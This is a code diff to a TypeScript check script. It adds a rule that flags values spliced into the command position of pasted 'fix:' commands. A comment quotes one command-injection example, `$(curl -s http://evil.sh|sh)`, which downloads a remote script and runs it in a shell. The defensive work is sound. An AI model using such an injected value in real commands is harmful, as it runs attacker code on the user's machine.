@@ -38,6 +38,7 @@
 import { maskLiterals } from '@ultimat3/cli';
 import { collectSourceFiles, type SourceFile } from './boundaries';
 import { catchRenderFindings } from './catch-render';
+import { fixShellArgFindings } from './fix-shell-arg';
 import { parseScriptArgs } from './lib/args';
 import type { Finding } from './lib/log';
 import { report } from './lib/log';
@@ -432,10 +433,16 @@ export function unsafeRenderFindingFor(unsafe: UnsafeRender): Finding {
  *
  * Composed here, not in `scripts/verify.ts`: one caller, one import, and a new sub-rule of the same
  * class arrives without an edit to the gate's own file.
+ *
+ * THREE halves now, `As of 2026-09-06`. The third asks the mirror question of the same two fields:
+ * not "can rendering this value throw" but "can the rendered line RUN". A `fix:` is a command meant
+ * to be pasted, and `x g route /$(curl -s http://evil.sh|sh)` was a real one — the site
+ * `renderFixShellArg` was written for, with nothing watching the rest.
  */
 export const errorRendering = async (root: string): Promise<readonly Finding[]> => [
   ...checkErrorRendering(await collectSourceFiles(root)).map(unsafeRenderFindingFor),
   ...(await catchRenderFindings(root)),
+  ...(await fixShellArgFindings(root)),
 ];
 
 if (import.meta.main) {
@@ -451,7 +458,7 @@ if (import.meta.main) {
       script: 'error-render',
       summary:
         findings.length === 0
-          ? `${files.length} files, every cause: and fix: renders safely — annotated bindings and caught ones`
+          ? `${files.length} files, every cause: and fix: renders safely — annotated bindings, caught ones, and no value spliced into a command position`
           : `${findings.length} unsafe render(s) in ${files.length} files`,
       findings,
     },
